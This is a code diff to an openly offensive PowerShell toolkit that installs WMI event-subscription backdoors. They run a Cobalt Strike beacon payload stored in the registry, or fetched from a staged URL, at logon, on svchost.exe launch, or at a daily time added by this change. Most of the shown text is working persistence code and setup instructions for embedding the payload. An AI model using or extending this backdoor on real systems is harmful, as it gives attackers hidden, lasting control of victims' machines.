@@ -3,7 +3,7 @@
 # Note: In order to use the Install-WMIBackdoorRegStageless command, you must first create a fully staged powershell payload.
 #   To create this using Cobalt Strike, go to Attacks -> Packages -> Windows Executable (S) -> Powershell.  And save to /root/beacon.ps1
 #   Then run:   base64 -w 0 /root/beacon.ps1 | xclip -selection clip     And copy the content to the $fullyStagedPayload variable below.
-$fullyStagedPayload = "U2V0LV..."
+$fullyStagedPayload = "U2V0L..."
 
 function Install-WMIBackdoorRegStageless
 {
@@ -20,6 +20,12 @@ function Install-WMIBackdoorRegStageless
     Note: It is recommended that you use a value located in HKU:S-1-5-18, HKU:S-1-5-19, or HKU:S-1-5-20 for best reliability.
     Storing payload in HKLM or HKCU hives may result in payload not being saved if the user has logged out before perstance function is run.
     Default: HKU:S-1-5-18\Software\Microsoft\Windows\SecurityKey
+
+    .PARAMETER Daily
+    Switch to change trigger from logon/svchost.exe to executing once a day.
+
+    .PARAMETER Time
+    Time to execute payload, only valid if Daily switch is set to true.
 
     .PARAMETER Interval
     Interval to be used for how often to send notifications for events (In seconds).  It is recommended to avoid using small intervals. 
@@ -42,9 +48,15 @@ function Install-WMIBackdoorRegStageless
         [string]
         $RegPath = "HKU:S-1-5-18\Software\Microsoft\Windows\SecurityKey",
 
+        [Parameter(Mandatory=$False, Position=0)]
+        [switch]$Daily,
+
+        [Parameter(Mandatory=$False, Position=0)]
+        [string]
+        $time="8:15",
+
         [Parameter(Mandatory=$False)]
-        [int]
-        $Interval=300
+        [int]$Interval=300
     )
 
     Sanity-Check
@@ -70,7 +82,17 @@ function Install-WMIBackdoorRegStageless
     }
 
     #Build the Query
-    $Query = "SELECT * FROM __InstanceCreationEvent WITHIN $Interval WHERE (TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'svchost.exe') OR (TargetInstance ISA 'Win32_LogonSession' AND (TargetInstance.LogonType = 2 OR TargetInstance.LogonType = 11))"
+    if ( $Daily )
+    {
+        $Hour = $time.Split(":")[0]
+        $Min = $time.Split(":")[-1] 
+        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' and ( TargetInstance.Hour = $Hour and TargetInstance.Minute = $Min and TargetInstance.Second = 0)"
+    }
+    else
+    {
+        $Query = "SELECT * FROM __InstanceCreationEvent WITHIN $Interval WHERE (TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'svchost.exe') OR (TargetInstance ISA 'Win32_LogonSession' AND (TargetInstance.LogonType = 2 OR TargetInstance.LogonType = 11))"
+    }
+    
 
     #Build the filter
     $NS = "root\subscription"
@@ -133,6 +155,12 @@ function Install-WMIBackdoorStagedURL
     .PARAMETER Name
     The name to use for the Event Filter and Consumer.  This name will be used later to remove the backdoor.
 
+    .PARAMETER Daily
+    Switch to change trigger from logon/svchost.exe to executing once a day.
+
+    .PARAMETER Time
+    Time to execute payload, only valid if Daily switch is set to true.
+
     .PARAMETER Interval
     Interval used for how often to check for events (in seconds). 
     Default: 300
@@ -149,6 +177,13 @@ function Install-WMIBackdoorStagedURL
         [Parameter(Mandatory=$True)]
         [string]$Name,
 
+        [Parameter(Mandatory=$False, Position=0)]
+        [switch]$Daily,
+
+        [Parameter(Mandatory=$False, Position=0)]
+        [string]
+        $time="8:15",
+
         [Parameter(Mandatory=$False)]
         [int]$Interval=300
     )
@@ -156,9 +191,17 @@ function Install-WMIBackdoorStagedURL
     Sanity-Check
     
     #Build the Query 
-    #$Query = "SELECT * FROM __InstanceCreationEvent WITHIN $Interval WHERE TargetInstance ISA 'Win32_LogonSession' AND (TargetInstance.LogonType = 2 OR TargetInstance.LogonType = 11)"
-    $Query = "SELECT * FROM __InstanceCreationEvent WITHIN $Interval WHERE (TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'svchost.exe') OR (TargetInstance ISA 'Win32_LogonSession' AND (TargetInstance.LogonType = 2 OR TargetInstance.LogonType = 11))"
-    
+    if ( $Daily )
+    {
+        $Hour = $time.Split(":")[0]
+        $Min = $time.Split(":")[-1] 
+        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' and ( TargetInstance.Hour = $Hour and TargetInstance.Minute = $Min)"
+    }
+    else
+    {
+        $Query = "SELECT * FROM __InstanceCreationEvent WITHIN $Interval WHERE (TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'svchost.exe') OR (TargetInstance ISA 'Win32_LogonSession' AND (TargetInstance.LogonType = 2 OR TargetInstance.LogonType = 11))"
+    }
+
     #Build the filter
     $NS = "root\subscription"
     $FilterArgs = @{
@@ -303,7 +346,7 @@ function Remove-WmiBackdoor
         [string]$Name,
 
         [Parameter(Mandatory=$False)]
-        [string]$RegPath = $null
+        [string]$RegPath = "HKU:S-1-5-18\Software\Microsoft\Windows\SecurityKey"
     )
 
 
